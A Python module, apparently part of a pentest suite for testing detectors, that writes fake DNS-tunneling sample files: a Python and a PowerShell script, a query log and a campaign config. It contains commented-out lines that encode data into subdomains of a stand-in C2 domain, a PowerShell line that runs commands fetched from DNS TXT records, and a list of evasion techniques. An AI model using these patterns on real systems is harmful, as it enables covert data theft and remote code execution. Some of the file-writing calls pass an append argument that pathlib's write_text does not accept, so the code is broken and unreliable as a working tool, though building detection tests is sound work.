#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
📡 sim_dns_tunnel — Simulation DNS Tunneling / Exfiltration
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Génère signatures DNS tunneling :
- Requêtes DNS avec données encodées en subdomain
- Pattern d'exfiltration via TXT records
- Script Python avec dnspython (commenté)
- Config JSON campagne DNS tunnel
AUCUNE requête DNS réelle n'est envoyée — signatures uniquement.
GPLv3 — Victor Pozen — Kerberos Pentest Suite v1.0
"""
import time
import json
import base64
from pathlib import Path
from datetime import datetime

MODULE_NAME  = "sim_dns_tunnel"
MODULE_LABEL = "DNS Tunnel"
_running     = False
_OUT_DIR     = Path(__file__).parent.parent / "payloads_fake" / "dns_tunnel"

def run(target: str = "127.0.0.1", callback=None) -> dict:
    global _running
    _running = True
    _OUT_DIR.mkdir(parents=True, exist_ok=True)
    
    results = {
        "module":    MODULE_NAME,
        "target":    target,
        "started":   datetime.now().isoformat(),
        "events":    [],
        "files":     [],
        "status":    "running",
    }
    
    def log(msg):
        results["events"].append(msg)
        if callback:
            callback(msg)
    
    log("📡 Démarrage simulation DNS Tunnel...")
    
    # ── Test 1 : Script DNS tunnel Python ────────────────────────────
    time.sleep(0.2)
    f1 = _OUT_DIR / "fake_dns_tunnel.py"
    f1.write_text(
        "#!/usr/bin/env python3\n"
        "# KERBEROS_PENTEST_TEST — DNS tunnel inoffensif\n"
        "# YARA $dnstun1 : dns.resolver.query\n"
        "# YARA $dnstun2 : TXT record exfil\n"
        "# YARA $dnstun3 : base64 subdomain\n"
        "\n"
        "import dns.resolver  # import réel mais jamais exécuté\n"
        "import base64\n"
        "\n"
        "C2_DOMAIN = \"c2.KERBEROS_PENTEST_TEST.com\"\n"
        "\n"
        "def fake_dns_exfil(data: str):\n"
        "    # Encoded data in subdomain\n"
        "    encoded = base64.b32encode(data.encode()).decode().replace('=', '')\n"
        "    # query = f\"{encoded}.{C2_DOMAIN}\"  # commenté — jamais résolu\n"
        "    # dns.resolver.query(query, 'A')  # commenté\n"
        "    print(f'[FAKE] DNS exfil simulé : {encoded[:20]}...')\n"
        "\n"
        "def fake_dns_beacon():\n"
        "    # while True:  # beacon loop  ' commenté\n"
        "    #     fake_dns_exfil('heartbeat')  ' commenté\n"
        "    #     time.sleep(60)  ' commenté\n"
        "    print('KERBEROS_PENTEST_TEST — beacon simulation')\n"
        "\n"
        "# YARA $dnstun4 : dnspython library\n"
        "# YARA $dnstun5 : long subdomain (>50 chars)\n"
        "\n"
        "if __name__ == '__NEVER__':\n"
        "    fake_dns_beacon()\n",
        encoding="utf-8"
    )
    results["files"].append(str(f1))
    log(f"✅ Créé : {f1.name}")
    log("   → YARA doit détecter : DNS_Tunnel_Python_Script")
    
    # ── Test 2 : Log de requêtes DNS suspectes ───────────────────────
    time.sleep(0.2)
    f2 = _OUT_DIR / "fake_dns_queries.log"
    # Simule des subdomains encodés (typiques DNS tunnel)
    fake_queries = [
        "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.data.KERBEROS_TEST.com",
        "ZXhmaWx0cmF0aW9uIGRhdGEgaGVyZQ.exfil.KERBEROS_TEST.com",
        "Y29tbWFuZCBhbmQgY29udHJvbA.c2.KERBEROS_TEST.com",
        "c2VjcmV0IGRhdGEgZW5jb2RlZA.tunnel.KERBEROS_TEST.com",
        "S0VSQkVST1NfUEVOVFJFU1RfVEVTVA.beacon.KERBEROS_TEST.com",
    ]
    f2.write_text(
        "KERBEROS_PENTEST_TEST — DNS Tunnel Simulation\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Ces requêtes DNS sont FAUSSES — aucune résolution réelle\n"
        "\n"
    )
    for q in fake_queries:
        f2.write_text(f"[QUERY] {q} (A record)\n", encoding="utf-8", append=True)
    f2.write_text(
        "\n"
        "-- YARA $dnstun6 : long subdomain (>50 chars)\n"
        "-- YARA $dnstun7 : base64-like pattern in DNS\n"
        "-- guard_netshield.py doit détecter : DNS anomaly\n",
        encoding="utf-8",
        append=True
    )
    results["files"].append(str(f2))
    log(f"✅ Créé : {f2.name}")
    log("   → YARA + guard_netshield.py : DNS_Tunnel_Pattern")
    
    # ── Test 3 : PowerShell DNS tunnel ───────────────────────────────
    time.sleep(0.2)
    f3 = _OUT_DIR / "fake_powershell_dns.ps1"
    f3.write_text(
        "# KERBEROS_PENTEST_TEST — PowerShell DNS tunnel\n"
        "# YARA $psdns1 : Resolve-DnsName\n"
        "# YARA $psdns2 : Invoke-Expression + DNS\n"
        "\n"
        "$C2Domain = \"c2.KERBEROS_PENTEST_TEST.com\"\n"
        "\n"
        "function Invoke-DnsTunnel {\n"
        "    param([string]$Data)\n"
        "    # $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data))  ' commenté\n"
        "    # $query = \"$encoded.$C2Domain\"  ' commenté\n"
        "    # Resolve-DnsName $query -Type TXT  ' commenté\n"
        "    Write-Host \"[FAKE] PowerShell DNS tunnel : $Data\"\n"
        "}\n"
        "\n"
        "# YARA $psdns3 : IEX + DNS\n"
        "# IEX (Resolve-DnsName \"cmd.KERBEROS_TEST.com\" -Type TXT).Strings  ' commenté\n"
        "\n"
        "Write-Host \"KERBEROS_PENTEST_TEST — simulation only\"\n",
        encoding="utf-8"
    )
    results["files"].append(str(f3))
    log(f"✅ Créé : {f3.name}")
    log("   → YARA doit détecter : PowerShell_DNS_Tunnel")
    
    # ── Test 4 : Config JSON campagne DNS tunnel ─────────────────────
    time.sleep(0.2)
    f4 = _OUT_DIR / "fake_dns_tunnel_config.json"
    config = {
        "campaign":       "KERBEROS_PENTEST_TEST",
        "techniques":     ["subdomain_encoding", "TXT_exfil", "beacon_via_DNS"],
        "encoding":       ["base64", "base32", "hex"],
        "c2_domains":     ["c2.KERBEROS_TEST.com", "exfil.KERBEROS_TEST.com"],
        "detection_evasion": ["low_frequency", "domain_generation", "fast_flux"],
        "note":           "Simulation inoffensive — aucune requête DNS réelle"
    }
    f4.write_text(json.dumps(config, indent=2), encoding="utf-8")
    results["files"].append(str(f4))
    log(f"✅ Créé : {f4.name}")
    log("   → YARA : DNS_Tunnel_Config_Pattern")
    
    log(f"📊 {len(results['files'])} fichier(s) DNS tunnel créés")
    log("⏳ En attente détection par guard_yara.py + guard_netshield.py + guard_ai_shield.py...")
    
    results["status"]   = "completed"
    results["finished"] = datetime.now().isoformat()
    _running = False
    return results

def stop():
    global _running
    _running = False

def get_info() -> dict:
    return {
        "name":        MODULE_NAME,
        "label":       MODULE_LABEL,
        "description": "Génère signatures DNS tunnel — aucune requête DNS réelle",
        "version":     "1.0",
        "targets":     ["guard_yara.py", "guard_netshield.py", "guard_ai_shield.py"],
    }

if __name__ == "__main__":
    result = run()
    print(f"✅ {len(result['files'])} fichiers créés")